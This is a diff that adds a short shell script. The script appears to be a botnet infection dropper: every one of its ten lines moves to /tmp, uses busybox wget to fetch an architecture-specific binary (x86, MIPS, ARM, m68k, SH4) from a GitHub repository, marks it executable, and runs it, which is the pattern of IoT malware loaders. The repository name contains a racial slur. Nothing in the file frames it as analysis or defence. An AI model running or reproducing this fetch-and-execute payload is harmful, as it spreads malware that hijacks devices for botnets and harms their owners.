@@ -1,0 +1,10 @@
+cd /tmp ; rm -rf x86_64 ; /bin/busybox wget http://github.com/caonim2le/yournigas/raw/main/x86_64 ; chmod 777 x86_64 ; ./x86_64 wget_x64 ;
+cd /tmp ; rm -rf mpsl ; /bin/busybox wget http://github.com/caonim2le/yournigas/raw/main/mpsl ; chmod 777 mpsl ; ./mpsl wget_mpsl ;
+cd /tmp ; rm -rf mips ; /bin/busybox wget http://github.com/caonim2le/yournigas/raw/main/mips ; chmod 777 mips ; ./mips wget_mips ; 
+cd /tmp ; rm -rf arm5 ; /bin/busybox wget http://github.com/caonim2le/yournigas/raw/main/arm ; chmod 777 arm ; ./arm wget_arm4 ;
+cd /tmp ; rm -rf arm4 ; /bin/busybox wget http://github.com/caonim2le/yournigas/raw/main/arm5 ; chmod 777 arm5 ; ./arm5 wget_arm5 ;
+cd /tmp ; rm -rf arm6 ; /bin/busybox wget http://github.com/caonim2le/yournigas/raw/main/arm6 ; chmod 777 arm6 ; ./arm6 wget_arm6 ;
+cd /tmp ; rm -rf arm7 ; /bin/busybox wget http://github.com/caonim2le/yournigas/raw/main/arm7 ; chmod 777 arm7 ; ./arm7 wget_arm7 ; 
+cd /tmp ; rm -rf m68k ; /bin/busybox wget http://github.com/caonim2le/yournigas/raw/main/m68k ; chmod 777 m68k ; ./m68k wget_m68 ;
+cd /tmp ; rm -rf x86 ; /bin/busybox wget http://github.com/caonim2le/yournigas/raw/main/x86_32 ; chmod 777 x86_32 ; ./x86_32 wget_x86 ;
+cd /tmp ; rm -rf spc ; /bin/busybox wget http://github.com/caonim2le/yournigas/raw/main/sh4 ; chmod 777 sh4 ; ./sh4 wget_sh4 ;
